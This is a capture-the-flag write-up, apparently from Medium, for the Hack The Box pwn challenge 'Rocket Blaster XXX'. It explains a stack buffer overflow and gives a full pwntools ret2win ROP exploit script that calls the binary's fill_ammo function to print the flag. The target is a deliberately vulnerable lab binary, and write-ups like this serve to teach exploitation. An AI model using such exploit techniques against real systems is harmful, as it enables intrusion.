# :game_die: HTB: Cyber Apocalypse 2024 - Rocket Blaster XXX

---

# HTB: Cyber Apocalypse 2024 — Rocket Blaster XXX

Difficulty: Easy

### Description

Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray — let the fight commence!

### Protection (checksec)

```
$ checksec
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
RUNPATH: b'./glibc/'
SHSTK: Enabled
IBT: Enabled
Stripped: No
```

### Disassembly (ghidra)

*32 bytes buffer (102 bytes is read)*

We can notice in the read method, we read 0x66 (102) bytes of data, but the buffer is 32 bytes long.

## Get Szigecsán Dávid’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

*win function with specific parameters*

Additionally, we find the fill_ammo function, which validates three parameters before reading and printing the flag.

### Exploitation

- Overflows the buffer (32 bytes + 8 bytes for saved RBP)

- Uses Return-Oriented Programming (ROP) to call fill_ammo with the correct arguments

### Solution (pwntools)

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './rocket_blaster_xxx')

context.log_level = "INFO"
context(terminal=['tmux', 'split-window', '-h'])

host = args.HOST or '83.136.254.189'
port = int(args.PORT or 49069)

def start_local(argv=[], *a, kw):
if args.GDB:
return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, kw)
else:
return process([exe.path] + argv, *a, kw)

def start_remote(argv=[], *a, kw):
io = connect(host, port)
if args.GDB:
gdb.attach(io, gdbscript=gdbscript)
return io

def start(argv=[], *a, kw):
if args.REMOTE:
return start_remote(argv, *a, kw)
else:
return start_local(argv, *a, kw)

gdbscript = '''
init-gef
continue
'''.format(locals())

#===========================================================
# EXPLOIT GOES HERE
#===========================================================
# Arch: amd64-64-little
# RELRO: Full RELRO
# Stack: No canary found
# NX: NX enabled
# PIE: No PIE (0x400000)
# RUNPATH: b'./glibc/'
# SHSTK: Enabled
# IBT: Enabled
# Stripped: No

io = start()

rop = ROP(exe)
rop.raw(rop.find_gadget(['ret']).address)
rop.fill_ammo(0xdeadbeef, 0xdeadbabe, 0xdead1337)
io.sendline(b'A' * 32 + b'B' * 8 + rop.chain())
io.recvuntil(b'Ready to launch at: ')

warning('Flag: ' + io.recv().decode('utf-8'))

io.interactive()
```

### Skills Learned

- buffer overflow

- ret2win

- ROP (Return-Oriented Programming)

---
